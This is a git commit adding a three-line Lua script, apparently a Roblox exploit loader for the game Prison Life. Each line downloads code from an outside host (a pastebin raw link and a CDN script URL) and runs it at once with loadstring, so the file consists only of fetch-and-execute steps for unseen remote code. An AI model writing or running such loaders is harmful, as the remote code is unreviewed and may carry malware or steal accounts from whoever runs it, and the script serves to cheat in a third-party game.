723dbba17c5e9d199b94b9e3800db7715d15bc53
Trix <80095537+TrixAde@users.noreply.github.com>
2021-09-05 21:57:46 +0200

    Create prison-life.lua

---
+++ prison-life.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
+--------------------------------------------------------------------------------------------------
+pcall(loadstring(game:HttpGet("https://cdn.julman.fr/scripts/32.lua")))
